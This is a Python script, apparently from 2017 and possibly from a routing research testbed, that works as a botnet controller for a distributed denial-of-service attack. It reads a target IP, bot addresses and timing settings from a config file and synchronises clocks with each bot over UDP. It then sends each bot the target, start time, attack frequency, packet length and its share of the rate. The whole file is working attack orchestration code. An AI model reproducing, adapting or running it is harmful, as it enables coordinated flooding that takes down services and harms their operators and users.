# -*- coding: utf-8 -*-
"""
Created on Fri Oct 27 20:21:48 2017

@author: zyl
"""
import socket
import time
import datetime
def get_arg():
    bot_ip_list = []
    attack_ip = ''
    attack_time = ''
    attack_frequency = ''
    f = open('/home/quagga/attack_info.txt','r')
    for line in f:
        if line[0] == '#':
            continue
        else:
            arg = line.strip().split(':')
            if arg[0] == 'attack_ip':
                attack_ip = arg[1]
            if arg[0] == 'bot_ip':
                for ip in arg[1].split():
                    bot_ip_list.append(ip)
            if arg[0] == 'start_time':
                start_time = arg[1]
            if arg[0] == 'wait':
                wait = arg[1]
            if arg[0] == 'attack_time':
                attack_time = arg[1]
            if arg[0] == 'per_attack_time':
                per_attack_time = arg[1]
            if arg[0] == 'attack_frequency':
                attack_frequency = arg[1]
            if arg[0] == 'length':
                length = arg[1]
            if arg[0] == 'max':
                max = arg[1]
    if wait != 'None':
        wait_sec = int(wait)
        now_time = datetime.datetime.now()
        delta = datetime.timedelta(seconds=wait_sec)
        start_time_date = now_time + delta
        start_time = start_time_date.strftime('%Y-%m-%d-%H-%M-%S')
    return [attack_ip,bot_ip_list,start_time,attack_time,per_attack_time,attack_frequency,length,max]
def get_time_diff(i,bot_ip):
    port = 17112
    host = bot_ip
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
#    print (host,port)
    data = 'time synchronization'
    s.sendto(data,(host,port))
    ts,addr=s.recvfrom(1024)
#    print ts
    s.close()
    tr = ("%.3f" % time.time())
#    print tr
    d = float(tr) - float(ts)
    return d
def attack(attack_ip,bot_ip,start_time_c,attack_time,attack_frequency,length,d,per_max,per_attack_time):
    bot_start_time = start_time_c - d
#    print bot_start_time
    port = 17111
    host = bot_ip
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    data = 'attack_ip:' + attack_ip + ' ' + 'bot_start_time:' + str(bot_start_time) + ' ' + 'attack_time:' + attack_time + ' ' + 'attack_frequency:' + attack_frequency + ' ' + 'length:' + length + ' ' + 'per_max:' + str(per_max) + ' ' + 'per_attack_time:' + str(per_attack_time)   
    s.sendto(data,(host,port))
    s.close()
def main():
    arg = get_arg()
    attack_ip = arg[0]
    bot_ip_list = arg[1]
    start_time = arg[2]
    start_time_c = time.mktime(time.strptime(start_time, "%Y-%m-%d-%H-%M-%S"))
    attack_time = arg[3]
    per_attack_time = arg[4]
    attack_frequency = arg[5]
    length = arg[6]
    max = arg[7]
    per_max = float(max) / len(bot_ip_list)
    d_list = []
    for i in range(len(bot_ip_list)):
        d = get_time_diff(i,bot_ip_list[i])
        d_list.append(d)

    for i in range(len(bot_ip_list)):
        attack(attack_ip,bot_ip_list[i],start_time_c,attack_time,attack_frequency,length,d_list[i],per_max,per_attack_time)
main()
